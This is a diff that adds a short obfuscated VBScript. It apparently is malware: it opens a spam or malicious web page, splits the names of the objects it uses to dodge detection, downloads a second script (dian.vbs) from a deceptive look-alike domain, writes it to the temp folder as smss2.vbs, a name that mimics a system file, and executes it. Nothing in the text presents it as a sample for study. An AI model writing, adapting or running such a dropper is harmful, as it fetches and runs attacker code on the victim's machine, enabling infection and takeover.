@@ -1,0 +1,21 @@
+on error resume next
+Set a240l2y8 = CreateObject("Wscript.Shell") 
+a240l2y8.Run("http://www.xsp5.info/index.htm")
+
+Set bz6t13a3 = CreateObject("Mic"&"rosoft.XM"&"L"&"HTTP")
+Set caw63mk3 = CreateObject("A"&"D"&"O"&"DB.St"&"r"&"ea"&"m")
+With bz6t13a3
+du0te5zp = "http://china.sogou.google.baidu.com.baidu163so.info:301/vbs/dian.vbs"
+.open "GET", du0te5zp, 0
+.Send()
+End With
+e4837s81=CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) &"\smss2.vbs"
+With caw63mk3
+.Type = eval("1")
+.Mode = eval("3")
+.open()
+.write eval("bz6t13a3.res"&"po"&"nse"&"Bod"&"y")
+.SaveToFile e4837s81, eval("2")
+End With
+a240l2y8.Run e4837s81, , True
+caw63mk3.Close
